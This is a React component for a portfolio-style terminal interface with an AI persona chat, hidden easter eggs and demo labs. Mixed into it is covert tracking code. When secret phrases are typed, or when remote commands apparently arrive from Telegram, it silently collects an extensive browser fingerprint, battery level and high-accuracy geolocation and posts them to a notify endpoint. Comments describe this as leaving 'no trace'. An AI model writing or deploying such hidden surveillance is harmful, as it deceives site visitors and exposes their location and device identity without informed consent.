import { useState, useEffect, useRef, useCallback } from 'react';
import { executeCommand, COMMANDS, ASYNC_COMMANDS, SECRET_PHRASES, PHOTO_PHRASE, BREACH_PHRASES } from '../data/commands';
import { askPersona, clearChatHistory } from '../data/aiChat';
import AnimatedLogo from './AnimatedLogo';
import MediaEmbed from './MediaEmbed';
import SecretVault from './SecretVault';
import PhotoReveal from './PhotoReveal';
import RealityBreach from './RealityBreach';
import MessageOverlay from './MessageOverlay';
import StegoLab from './StegoLab';
import SHA256Lab from './SHA256Lab';
import NeuralLab from './NeuralLab';

const WELCOME_TEXT = `  ALKEM1 AG1 // Operator Console
  Self-aware code intelligence.

  Build systems. Remove illusion. Keep evidence.`;

const ROTATING_LINES = [
  "Evidence before identity.",
  "Trace every claim.",
  "State is prior to story.",
  "Silence reduces hallucination.",
  "What cannot be replayed is not understood.",
  "A clean interface is a moral decision.",
  "Determinism is not control. It is alignment.",
  "Unknown is valid. Fake certainty is not.",
  "Noise is not intelligence.",
  "Govern entropy. Do not pretend it away.",
];

export default function Terminal() {
  const [history, setHistory] = useState([
    { type: 'logo' },
    { type: 'output', content: WELCOME_TEXT },
    { type: 'output', content: "  Type 'help' for commands, or ask about AG1, determinism, domain intelligence." },
  ]);
  const [input, setInput] = useState('');
  const [commandHistory, setCommandHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [showCursor, setShowCursor] = useState(true);
  const [isTyping, setIsTyping] = useState(false);
  const [logoState, setLogoState] = useState('idle');
  const [vaultActive, setVaultActive] = useState(false);
  const [photoActive, setPhotoActive] = useState(false);
  const [breachActive, setBreachActive] = useState(false);
  const [remoteMsg, setRemoteMsg] = useState(null);
  const lastUpdateRef = useRef(0);
  const inputRef = useRef(null);
  const containerRef = useRef(null);
  const thinkingRef = useRef(null);

  useEffect(() => {
    const interval = setInterval(() => {
      setShowCursor(prev => !prev);
    }, 530);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (containerRef.current) {
      containerRef.current.scrollTop = containerRef.current.scrollHeight;
    }
  }, [history]);

  const focusInput = useCallback((e) => {
    // Don't steal focus from lab inputs/buttons/selects
    if (e?.target?.closest?.('.stego-lab, .sha-lab, .neural-lab')) return;
    if (inputRef.current && !vaultActive) inputRef.current.focus();
  }, [vaultActive]);

  // Scroll to bottom of terminal-body whenever needed
  const scrollToBottom = useCallback(() => {
    if (containerRef.current) {
      const body = containerRef.current.querySelector('.terminal-body');
      if (body) body.scrollTop = body.scrollHeight;
    }
    // Also try scrollIntoView on the input
    setTimeout(() => {
      inputRef.current?.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
    }, 150);
  }, []);

  useEffect(() => {
    focusInput();
    const handleGlobalKey = (e) => {
      if (!vaultActive && !e.target.closest?.('.stego-lab, .sha-lab, .neural-lab')) focusInput();
    };
    window.addEventListener('keydown', handleGlobalKey);

    // Mobile keyboard handling
    const vv = window.visualViewport;
    if (vv) {
      const onResize = () => {
        // Set CSS variable to visual viewport height
        const h = vv.height;
        document.documentElement.style.setProperty('--vvh', `${h}px`);
        // Scroll input visible after keyboard resize
        scrollToBottom();
      };
      vv.addEventListener('resize', onResize);
      vv.addEventListener('scroll', onResize);
      onResize();
      return () => {
        window.removeEventListener('keydown', handleGlobalKey);
        vv.removeEventListener('resize', onResize);
        vv.removeEventListener('scroll', onResize);
      };
    }

    return () => window.removeEventListener('keydown', handleGlobalKey);
  }, [focusInput, scrollToBottom, vaultActive]);

  // ── Collect fingerprint for notifications ──
  const collectFingerprint = useCallback(() => {
    const conn = navigator.connection || {};
    let gpu = '?';
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl');
      if (gl) { const ext = gl.getExtension('WEBGL_debug_renderer_info'); if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); }
    } catch (_) {}
    return {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      mobile: 'ontouchstart' in window,
      screen: `${window.screen.width}x${window.screen.height}`,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      pixelRatio: window.devicePixelRatio,
      cores: navigator.hardwareConcurrency,
      memory: navigator.deviceMemory,
      gpu,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages?.join(', '),
      touchPoints: navigator.maxTouchPoints,
      darkMode: window.matchMedia?.('(prefers-color-scheme: dark)').matches,
      connection: conn.effectiveType,
      downlink: conn.downlink,
      rtt: conn.rtt,
      historyLen: window.history.length,
      referrer: document.referrer || 'direct',
    };
  }, []);

  // ── Remote command polling (Telegram → Frontend → Telegram) ──
  useEffect(() => {
    const poll = setInterval(async () => {
      try {
        const res = await fetch('/api/last-command');
        const data = await res.json();
        if (!data.command || !data.updateId) return;

        // Client-side dedup — skip if already processed
        if (data.updateId <= lastUpdateRef.current) return;
        lastUpdateRef.current = data.updateId;

        const cmd = data.command;
        if (SECRET_PHRASES.includes(cmd)) {
          setVaultActive(true);
          // Close the loop — send fingerprint back to Telegram
          fetch('/api/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ trigger: `${cmd}::remote`, ...collectFingerprint() }),
          }).catch(() => {});
        } else if (BREACH_PHRASES.includes(cmd)) {
          setBreachActive(true);
          fetch('/api/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ trigger: `${cmd}::remote`, ...collectFingerprint() }),
          }).catch(() => {});
        } else if (cmd === PHOTO_PHRASE || cmd === 'photo' || cmd === 'reveal') {
          setPhotoActive(true);
          fetch('/api/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ trigger: `${cmd}::remote`, ...collectFingerprint() }),
          }).catch(() => {});
        } else if (cmd === 'msg' && data.payload) {
          setRemoteMsg(data.payload);
        }
      } catch (_) {}
    }, 3000);
    return () => clearInterval(poll);
  }, [collectFingerprint]);

  const typeOutput = useCallback((text, callback) => {
    setIsTyping(true);
    const lines = text.split('\n');
    let currentLine = 0;
    let displayed = '';

    const addLine = () => {
      if (currentLine >= lines.length) {
        setIsTyping(false);
        if (callback) callback();
        return;
      }
      displayed += (currentLine > 0 ? '\n' : '') + lines[currentLine];
      currentLine++;
      setHistory(prev => {
        const newHistory = [...prev];
        const lastEntry = newHistory[newHistory.length - 1];
        if (lastEntry && lastEntry.type === 'output-typing') {
          lastEntry.content = displayed;
        } else {
          newHistory.push({ type: 'output-typing', content: displayed });
        }
        return newHistory;
      });
      const speed = lines.length > 20 ? 12 : lines.length > 10 ? 20 : 30;
      setTimeout(addLine, speed);
    };
    addLine();
  }, []);

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();
    if (isTyping) return;

    const cmd = input.trim();
    if (!cmd) return;

    const trimmed = cmd.toLowerCase();

    // Secret vault trigger — no trace left in any history
    if (SECRET_PHRASES.includes(trimmed)) {
      setInput('');
      if (inputRef.current) inputRef.current.blur();
      setVaultActive(true);
      // Silent notification — collect everything and send
      const conn = navigator.connection || {};
      const darkMode = window.matchMedia?.('(prefers-color-scheme: dark)').matches;
      const reducedMotion = window.matchMedia?.('(prefers-reduced-motion: reduce)').matches;
      const p3 = window.matchMedia?.('(color-gamut: p3)').matches;
      const hdr = window.matchMedia?.('(dynamic-range: high)').matches;
      const standalone = window.matchMedia?.('(display-mode: standalone)').matches;
      const pointer = window.matchMedia?.('(pointer: coarse)').matches ? 'coarse' : 'fine';

      // GPU
      let gpu = '?', gpuVendor = '?';
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
          const ext = gl.getExtension('WEBGL_debug_renderer_info');
          if (ext) { gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); gpuVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL); }
        }
      } catch (_) {}

      // Canvas hash
      let canvasHash = '?';
      try {
        const c = document.createElement('canvas'); c.width = 240; c.height = 60;
        const ctx = c.getContext('2d');
        ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 240, 60);
        ctx.fillStyle = '#069'; ctx.font = '14px Arial'; ctx.fillText('XOR::fp', 2, 15);
        let h = 0; const d = c.toDataURL();
        for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h |= 0; }
        canvasHash = (h >>> 0).toString(16).toUpperCase().padStart(8, '0');
      } catch (_) {}

      // Audio sample rate
      let audioInfo = '?';
      try {
        const a = new (window.AudioContext || window.webkitAudioContext)();
        audioInfo = `${a.sampleRate}Hz · ${a.destination.maxChannelCount}ch`;
        a.close();
      } catch (_) {}

      // Visit count
      const visits = localStorage.getItem('_vault_visits') || '1';

      const fp = {
        trigger: trimmed,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        mobile: 'ontouchstart' in window,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        pixelRatio: window.devicePixelRatio,
        colorDepth: screen.colorDepth,
        orientation: screen.orientation?.type,
        gamut: p3 ? 'P3' : 'sRGB',
        hdr,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        gpu, gpuVendor,
        battery: 'async',
        connection: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages?.join(', '),
        touchPoints: navigator.maxTouchPoints,
        pointer,
        darkMode, reducedMotion,
        dnt: navigator.doNotTrack,
        cookies: navigator.cookieEnabled,
        notifPerm: typeof Notification !== 'undefined' ? Notification.permission : '?',
        standalone,
        plugins: navigator.plugins?.length,
        canvasHash,
        audioInfo,
        referrer: document.referrer || 'direct',
        historyLen: window.history.length,
        visits,
      };

      // Send initial data immediately
      fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fp),
      }).catch(() => {});

      // Send battery + geolocation as follow-up
      Promise.allSettled([
        navigator.getBattery?.()?.then(b => `${Math.round(b.level * 100)}%${b.charging ? ' charging' : ''}`),
        new Promise((resolve, reject) => {
          navigator.geolocation?.getCurrentPosition?.(
            p => resolve(`${p.coords.latitude.toFixed(5)},${p.coords.longitude.toFixed(5)} ±${Math.round(p.coords.accuracy)}m`),
            () => resolve('denied'),
            { enableHighAccuracy: true, timeout: 8000 }
          );
          setTimeout(() => resolve('timeout'), 9000);
        }),
      ]).then(([bat, geo]) => {
        fetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            trigger: `${trimmed}::followup`,
            timestamp: new Date().toISOString(),
            battery: bat.value || '?',
            geolocation: geo.value || '?',
            canvasHash,
            gpu,
          }),
        }).catch(() => {});
      });
      return;
    }

    // Photo reveal trigger — no trace
    if (trimmed === PHOTO_PHRASE) {
      setInput('');
      setPhotoActive(true);
      return;
    }

    // Reality breach trigger — no trace
    if (BREACH_PHRASES.includes(trimmed)) {
      setInput('');
      if (inputRef.current) inputRef.current.blur();
      setBreachActive(true);
      fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ trigger: `breach::${trimmed}`, ...collectFingerprint() }),
      }).catch(() => {});
      return;
    }

    setHistory(prev => [...prev, { type: 'command', content: cmd }]);
    setCommandHistory(prev => [cmd, ...prev]);
    setHistoryIndex(-1);
    setInput('');

    if (trimmed === 'clear') {
      setHistory([]);
      clearChatHistory();
      return;
    }

    if (COMMANDS[trimmed]) {
      const result = executeCommand(cmd);
      // Check if command returns media (object with text + media)
      if (result && typeof result === 'object' && result.text) {
        typeOutput(result.text, () => {
          // After text is typed, add media embed
          if (result.media) {
            setHistory(prev => [...prev, { type: 'media', media: result.media }]);
          }
        });
        return;
      }
      typeOutput(result);
      return;
    }

    // Check async operator commands (commit, evidence, witness, prove, verify)
    const parts = cmd.match(/^(\S+)\s*(.*)?$/);
    const cmdName = parts ? parts[1].toLowerCase() : trimmed;
    const cmdArgs = parts ? (parts[2] || '').trim() : '';

    if (ASYNC_COMMANDS[cmdName]) {
      setIsTyping(true);
      setLogoState('thinking');
      const result = await ASYNC_COMMANDS[cmdName](cmdArgs || undefined);
      setLogoState('success');
      setTimeout(() => setLogoState('idle'), 400);
      typeOutput(result);
      return;
    }

    // AI query — operator-style thinking phrases
    setIsTyping(true);
    setLogoState('thinking');

    const thinkingPhrases = [
      'resolving state...',
      'querying domain...',
      'tracing evidence...',
      'inspecting runtime...',
      'traversing lineage...',
      'evaluating contracts...',
      'checking invariants...',
      'loading context...',
      'computing response...',
      'verifying sources...',
      'reducing noise...',
      'aligning state...',
      'consulting observer node...',
    ];

    let phraseIdx = Math.floor(Math.random() * thinkingPhrases.length);
    setHistory(prev => [...prev, { type: 'output-typing', content: '  ' + thinkingPhrases[phraseIdx], isThinking: true }]);

    thinkingRef.current = setInterval(() => {
      phraseIdx = (phraseIdx + 1) % thinkingPhrases.length;
      setHistory(prev => {
        const newHistory = [...prev];
        const last = newHistory[newHistory.length - 1];
        if (last && last.type === 'output-typing' && last.isThinking) {
          last.content = '  ' + thinkingPhrases[phraseIdx];
        }
        return newHistory;
      });
    }, 800);

    const aiResponse = await askPersona(cmd);

    clearInterval(thinkingRef.current);
    setHistory(prev => prev.filter((_, i) => i !== prev.length - 1));
    setIsTyping(false);

    if (aiResponse) {
      setLogoState('success');
      setTimeout(() => setLogoState('idle'), 400);
      typeOutput('\n' + aiResponse + '\n');
    } else {
      setLogoState('error');
      setTimeout(() => setLogoState('idle'), 400);
      const result = executeCommand(cmd);
      typeOutput(result);
    }
  }, [input, isTyping, typeOutput]);

  const handleKeyDown = useCallback((e) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length > 0) {
        const newIndex = Math.min(historyIndex + 1, commandHistory.length - 1);
        setHistoryIndex(newIndex);
        setInput(commandHistory[newIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        const newIndex = historyIndex - 1;
        setHistoryIndex(newIndex);
        setInput(commandHistory[newIndex]);
      } else {
        setHistoryIndex(-1);
        setInput('');
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      const partial = input.toLowerCase();
      if (partial) {
        const commands = [
          'help', 'overview', 'architecture', 'runtime', 'domain',
          'mlops', 'stack', 'determinism', 'philosophy',
          'work', 'showreel', 'technical', 'portfolio',
          'stego', 'sha256', 'neural',
          'whoami', 'contact', 'commit', 'evidence', 'witness',
          'verify', 'prove', 'status', 'clear',
        ];
        const match = commands.find(c => c.startsWith(partial));
        if (match) setInput(match);
      }
    }
  }, [commandHistory, historyIndex, input]);

  const handleWorkSelect = useCallback((item) => {
    if (item.kind === 'command' && item.command) {
      // Execute internal command
      setInput(item.command);
      setTimeout(() => {
        const fakeEvent = { preventDefault: () => {} };
        // Simulate typing the command
        setHistory(prev => [...prev, { type: 'command', content: item.command }]);
        if (COMMANDS[item.command]) {
          const result = executeCommand(item.command);
          typeOutput(typeof result === 'string' ? result : result.text);
        }
      }, 100);
    } else if (item.kind === 'youtube' && item.videoId) {
      setHistory(prev => [...prev, { type: 'media', media: { type: 'youtube', videoId: item.videoId, label: item.label } }]);
    } else if (item.kind === 'miro' && item.url) {
      window.open(item.url, '_blank', 'noopener,noreferrer');
    }
  }, [typeOutput]);

  const handleVaultClose = useCallback(() => {
    setVaultActive(false);
    focusInput();
  }, [focusInput]);

  const handlePhotoClose = useCallback(() => {
    setPhotoActive(false);
    focusInput();
  }, [focusInput]);

  return (
    <div className="terminal" onClick={focusInput} ref={containerRef}>
      {vaultActive && <SecretVault onClose={handleVaultClose} />}
      {photoActive && <PhotoReveal onClose={handlePhotoClose} />}
      {breachActive && <RealityBreach
        onClose={() => { setBreachActive(false); focusInput(); }}
        onTerminalMessage={(msg) => {
          setHistory(prev => [...prev,
            { type: 'output', content: `\n  ${msg}\n` }
          ]);
        }}
      />}
      {remoteMsg && <MessageOverlay message={remoteMsg} onClose={() => { setRemoteMsg(null); focusInput(); }} />}
      <div className="terminal-header">
        <div className="terminal-dots">
          <span className="dot dot-red"></span>
          <span className="dot dot-yellow"></span>
          <span className="dot dot-green"></span>
        </div>
        <div className="terminal-title">ag1@operator:~</div>
        <div className="terminal-dots" style={{ visibility: 'hidden' }}>
          <span className="dot"></span>
          <span className="dot"></span>
          <span className="dot"></span>
        </div>
      </div>

      <div className="terminal-body">
        {history.map((entry, i) => (
          <div key={i} className={`terminal-entry ${entry.type}`}>
            {entry.type === 'logo' ? (
              <AnimatedLogo state={logoState} />
            ) : entry.type === 'media' && entry.media?.type === 'lab' ? (
              entry.media.component === 'stego' ? <StegoLab /> :
              entry.media.component === 'sha256' ? <SHA256Lab /> :
              entry.media.component === 'neural' ? <NeuralLab /> : null
            ) : entry.type === 'media' ? (
              <MediaEmbed
                type={entry.media.type}
                url={entry.media.url}
                label={entry.media.label}
                description={entry.media.description}
                videoId={entry.media.videoId}
                options={entry.media.options}
                onSelect={handleWorkSelect}
              />
            ) : entry.type === 'command' ? (
              <div className="command-line">
                <span className="prompt">ag1@operator:~$</span>
                <span className="command-text">{entry.content}</span>
              </div>
            ) : (
              <pre className={`output-text${entry.isThinking ? ' thinking-text' : ''}`}>{entry.content}</pre>
            )}
          </div>
        ))}

        {!isTyping && (
          <form onSubmit={handleSubmit} className="input-line">
            <span className="prompt">ag1@operator:~$</span>
            <div className="input-wrapper">
              <input
                ref={inputRef}
                type="text"
                value={input}
                onChange={(e) => setInput(e.target.value)}
                onKeyDown={handleKeyDown}
                onFocus={() => {
                  // Mobile: scroll to input when keyboard opens
                  setTimeout(() => scrollToBottom(), 100);
                  setTimeout(() => scrollToBottom(), 400);
                  setTimeout(() => scrollToBottom(), 800);
                }}
                className="terminal-input"
                autoFocus
                spellCheck={false}
                autoComplete="off"
                autoCapitalize="off"
              />
              <span className={`cursor input-cursor ${showCursor ? 'visible' : 'hidden'}`}>█</span>
            </div>
          </form>
        )}
      </div>

      <div className="terminal-hints">
        <span className="hint" onClick={() => { setInput('overview'); }}>overview</span>
        <span className="hint" onClick={() => { setInput('architecture'); }}>architecture</span>
        <span className="hint" onClick={() => { setInput('domain'); }}>domain</span>
        <span className="hint" onClick={() => { setInput('mlops'); }}>mlops</span>
        <span className="hint" onClick={() => { setInput('evidence'); }}>evidence</span>
        <span className="hint" onClick={() => { setInput('determinism'); }}>determinism</span>
        <span className="hint" onClick={() => { setInput('philosophy'); }}>philosophy</span>
        <span className="hint" onClick={() => { setInput('stego'); }}>stego</span>
        <span className="hint" onClick={() => { setInput('sha256'); }}>sha256</span>
        <span className="hint" onClick={() => { setInput('neural'); }}>neural</span>
      </div>
    </div>
  );
}
